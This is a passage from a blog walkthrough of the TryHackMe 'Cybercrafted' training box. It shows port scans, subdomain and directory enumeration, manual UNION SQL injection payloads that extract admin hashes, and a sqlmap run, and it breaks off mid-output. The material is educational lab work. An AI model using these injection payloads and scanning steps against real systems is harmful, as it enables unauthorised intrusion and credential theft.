<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Cybercrafted" /><meta property="og:locale" content="en" /><meta name="description" content="Intro" /><meta property="og:description" content="Intro" /><link rel="canonical" href="https://gore-ez-knee.github.io/posts/cybercrafted/" /><meta property="og:url" content="https://gore-ez-knee.github.io/posts/cybercrafted/" /><meta property="og:site_name" content="Gore-Ez-Knee" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-13T09:00:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Cybercrafted" /><meta name="twitter:site" content="@gore_ez_knee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-28T23:12:44-06:00","datePublished":"2022-02-13T09:00:00-06:00","description":"Intro","headline":"Cybercrafted","mainEntityOfPage":{"@type":"WebPage","@id":"https://gore-ez-knee.github.io/posts/cybercrafted/"},"url":"https://gore-ez-knee.github.io/posts/cybercrafted/"}</script><title>Cybercrafted | Gore-Ez-Knee</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gore-Ez-Knee"><meta name="application-name" content="Gore-Ez-Knee"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gore-Ez-Knee</a></div><div class="site-subtitle font-italic">Nerd</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/gore-ez-knee" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/gore_ez_knee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gore.ez.knee','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cybercrafted</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1920 300'%3E%3C/svg%3E" data-src="/assets/img/post_images/cybercrafted/cc-banner.png" class="preview-img bg" alt="Preview Image" width="1920" height="300" data-proofer-ignore><h1 data-toc-skip>Cybercrafted</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1644764400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-13 </em> </span> <span> Updated <em class="timeago" data-ts="1646111564" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4427 words"> <em>24 min</em> read</span></div></div></div><div class="post-content"><h2 id="intro"><span class="mr-2"><strong>Intro</strong></span><a href="#intro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://tryhackme.com/room/cybercrafted">Cybercrafted</a></p><p>This is a medium TryHackMe box which houses a Mincraft server. We enumerate subdomains and pages across those subdomains to find a vulnerable page. We find one of those pages is vulnerable to SQL injection which gives us credentials to login to an admin panel. This login brings us to a page which allows us to execute commands on the server. From there we can spawn a reverse shell to access the box and find an exposed ssh private key. With that we extract the passphrase hash off of the key, crack it, and ssh onto the box as the admin. From there we find credentials leaked in a log file which allows to switch to another user. That user is allowed to run a sudo command which allows us to spawn a root shell.</p><h2 id="enumeration"><span class="mr-2"><strong>Enumeration</strong></span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap"><span class="mr-2"><strong>Nmap</strong></span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>To get started, we begin with an nmap of the machine to find any open ports. I like to find all open ports to begin with, but it can be very time consuming. This nmap scan seems to work well within these isolated learning environmets to quickly find open ports on a system:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>sudo nmap -v --min-rate 10000 10.10.70.248 -p-

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:07 GMT
Initiating ARP Ping Scan at 03:07
Scanning 10.10.70.248 [1 port]
Completed ARP Ping Scan at 03:07, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 03:07
Scanning admin.cybercrafted.thm (10.10.70.248) [65535 ports]
Discovered open port 80/tcp on 10.10.70.248
Discovered open port 22/tcp on 10.10.70.248
Discovered open port 25565/tcp on 10.10.70.248
Completed SYN Stealth Scan at 03:07, 8.76s elapsed (65535 total ports)
Nmap scan report for admin.cybercrafted.thm (10.10.70.248)
Host is up (0.00059s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft
MAC Address: 02:62:A3:C2:8E:83 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
           Raw packets sent: 85547 (3.764MB) | Rcvd: 85547 (3.422MB)
</pre></table></code></div></div><p>This answers the first question.</p><blockquote><p>How many ports are open?</p></blockquote><p>Now that we know what the ports are, we can run some default scripts against them to tell us more information about the services those ports are hosting:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>sudo nmap -A 10.10.70.248 -p22,80,25565

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:13 GMT
Nmap scan report for admin.cybercrafted.thm (10.10.70.248)
Host is up (0.00046s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Log In
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
MAC Address: 02:62:A3:C2:8E:83 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms admin.cybercrafted.thm (10.10.70.248)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
</pre></table></code></div></div><p>The output here shows us what is running on the highest port.</p><blockquote><p>What service runs on the highest port?</p></blockquote><p>In the traceroute section of the output, we see a domain address <code class="language-plaintext highlighter-rouge">admin.cybercrafted.thm</code>. We’ll add this to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to access the site via virtual routing.</p><h3 id="subdomains"><span class="mr-2">Subdomains</span><a href="#subdomains" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Viewing the results of the Nmap output, we know that this server is hosting an http service. Typing the address <code class="language-plaintext highlighter-rouge">http://10.10.70.248</code> into the address bar of our browser returns an error:</p><p><img data-src="/assets/img/post_images/cybercrafted/screenshot1.png" alt="" data-proofer-ignore></p><p>It appears to be redirecting to <code class="language-plaintext highlighter-rouge">http://cybercrafted.thm</code>. We’ll add this to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file as well and retry the site.</p><p><img data-src="/assets/img/post_images/cybercrafted/screenshot2.png" alt="" data-proofer-ignore></p><p>The next question is asking if there are any subdomains. We’ve already seen one in the Nmap results, <code class="language-plaintext highlighter-rouge">admin.cybercrafted.thm</code>, but how would we find more? For this challenge I’m going to use <code class="language-plaintext highlighter-rouge">gobuster</code>. This server appears to already be virtually hosting a subdomain of <code class="language-plaintext highlighter-rouge">admin</code> so we’ll use <code class="language-plaintext highlighter-rouge">gobusters</code> <strong>vhost</strong> mode to enumerate potential subdomains. A great resource in wordlists is Daniel Miesslers <a href="https://github.com/danielmiessler/SecLists">SecLists</a>. If you aren’t using TryHackMe’s AttackBox, I’d recommend installing it on your own attack machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>gobuster vhost -u cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://cybercrafted.thm
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2021/11/21 03:53:23 Starting gobuster
===============================================================
Found: store.cybercrafted.thm (Status: 403) [Size: 287]
Found: admin.cybercrafted.thm (Status: 200) [Size: 937]
Found: www.store.cybercrafted.thm (Status: 403) [Size: 291]
Found: www.admin.cybercrafted.thm (Status: 200) [Size: 937]
---[snip]---
</pre></table></code></div></div><p>This is where I admittedly kept running into consistency issues. I used several wordlists under the /DNS directory and found the same couple of domains popping up: store and admin. Currently there is no way to filter out status codes using vhost mode on gobuster so there are times where the output gets flooded with 400 status codes. With the final subdmain shown to be three characters, I guess it was the most common one being <code class="language-plaintext highlighter-rouge">www</code> and it turned out to be correct. So far this should be what our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file looks like:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>127.0.0.1	localhost
127.0.1.1	tryhackme.lan	tryhackme

10.10.70.248	admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm cybercrafted.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre></table></code></div></div><blockquote><p>Any subdomains? (Alphabetical order)</p></blockquote><h3 id="directories"><span class="mr-2">Directories</span><a href="#directories" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Next up comes finding what directories/pages on on these domains. We’ll use <code class="language-plaintext highlighter-rouge">gobusters</code> <strong>dir</strong> mode to do this. First we’ll start with <code class="language-plaintext highlighter-rouge">www.cybercrafted.thm</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>gobuster dir -u http://www.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://www.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2021/11/21 04:08:35 Starting gobuster
===============================================================
/index.html (Status: 200)
/assets (Status: 301)
/. (Status: 200)
/secret (Status: 301)
===============================================================
2021/11/21 04:08:43 Finished
===============================================================
</pre></table></code></div></div><p>Oh secrets??</p><p><img data-src="/assets/img/post_images/cybercrafted/screenshot3.png" alt="" data-proofer-ignore></p><p>Oh…</p><p>They are only pictures. Perhaps there’s hidden info embedded within the images, but we’ll shelve that for now. Let’s keep looking for other pages. Next up is <code class="language-plaintext highlighter-rouge">admin.cybercrafted.thm</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admin.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/21 04:14:11 Starting gobuster
===============================================================
/index.php (Status: 200)
/login.php (Status: 302)
/assets (Status: 301)
/. (Status: 200)
/panel.php (Status: 302)
===============================================================
2021/11/21 04:14:20 Finished
===============================================================
</pre></table></code></div></div><p>All of the 300 codes redirect to /index.php which is the login page. Perhaps this where the vulnerability lies.</p><p><img data-src="/assets/img/post_images/cybercrafted/screenshot4.png" alt="" data-proofer-ignore></p><p>Running through some very common default credentials (admin:admin, admin:password, admin:password123, root:root, root:password) doesn’t provide any give.</p><p>Next trying some <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payloads</a>, and some potential <a href="https://portswigger.net/web-security/sql-injection">SQL Injection</a> doesn’t show promise either. We’ll look at the next domain:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://store.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/21 04:27:45 Starting gobuster
===============================================================
/xxxxxx.php (Status: 200)
/assets (Status: 301)
===============================================================
2021/11/21 04:27:55 Finished
===============================================================
</pre></table></code></div></div><p>It look like we have another input field to mess with.</p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot5.jpg" alt="" data-proofer-ignore></p><p>We’ll run throught the other steps with this domain as well.</p><p>We get some results the search <code class="language-plaintext highlighter-rouge">' OR 1=1-- -</code> is used. This appears to be SQL injectable</p><blockquote><p>On what page did you find the vulnerability?</p></blockquote><h2 id="exploitation"><span class="mr-2"><strong>Exploitation</strong></span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="sqli"><span class="mr-2"><strong>SQLi</strong></span><a href="#sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>If you haven’t already, I would recommend checking out <a href="https://portswigger.net/web-security/sql-injection">PortSwiggers Web Academy on SQL Injection</a>. We’ll try a UNION attack on the database.</p><blockquote><p>For a UNION query to work, two key requirements must be met:</p><p>The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:</p><p>How many columns are being returned from the original query? Which columns returned from the original query are of a suitable data type to hold the results from the injected query?</p></blockquote><p>Since error messages don’t appear to be returned to the webpage with a broken SQL query, we’ll use NULLs to to find the number of columns. Starting off with <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL-- -</code> shows nothing in the results. That’s okay. We’ll keep adding NULLs until we get a successful return. With the query <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL,NULL,NULL,NULL-- -</code> we see some results. Now we now there are four columns.</p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot6.jpg" alt="" data-proofer-ignore></p><p>Now to get the available tables, we can use the query <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables-- -</code></p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot7.jpg" alt="" data-proofer-ignore></p><p>The <code class="language-plaintext highlighter-rouge">admin</code> table at the bottom looks promising. Next we’ll see what fields the <code class="language-plaintext highlighter-rouge">admin</code> table has with <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='admin'-- -</code></p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot8.jpg" alt="" data-proofer-ignore></p><p>The admin table has an id, user, and hash field. To view the values from the fields, we’ll finish of this injection with <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL,NULL,user,hash FROM admin-- -</code></p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot9.jpg" alt="" data-proofer-ignore></p><p>Now if you wanted a script to take care of figuring this all out for you, you could have used <code class="language-plaintext highlighter-rouge">sqlmap</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre>sqlmap -u "store.cybercrafted.thm/xxxxxx.php" --method POST --data "search=doesnt&amp;submit=matter" -p search --batch --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 05:18:28

[05:18:28] [INFO] testing connection to the target URL
[05:18:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[05:18:28] [INFO] testing if the target URL content is stable
[05:18:29] [INFO] target URL content is stable
[05:18:29] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[05:18:29] [INFO] testing for SQL injection on POST parameter 'search'
[05:18:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:18:29] [INFO] testing 'MySQL &gt;= 5.0 boolean-based blind - Parameter replace'
[05:18:29] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:18:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:18:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:18:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:18:30] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'
[05:18:30] [INFO] testing 'MySQL inline queries'
[05:18:30] [INFO] testing 'PostgreSQL inline queries'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[05:18:30] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:18:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:18:30] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'
[05:18:30] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[05:18:30] [INFO] testing 'Oracle AND time-based blind'
[05:18:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:18:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:18:30] [INFO] target URL appears to have 4 columns in query
[05:18:30] [WARNING] applying generic concatenation (CONCAT)
[05:18:30] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[05:18:30] [INFO] checking if the injection point on POST parameter 'search' is a false positive
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=doesnt' UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qqbpq','tCMDIXovbmVxcjxBkbxvhDNNverteIdImoAtEJRH'),'qqbqq')-- YnFh&amp;submit=matter
---
[05:18:30] [INFO] testing MySQL
[05:18:30] [INFO] confirming MySQL
[05:18:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL &gt;= 5.0.0
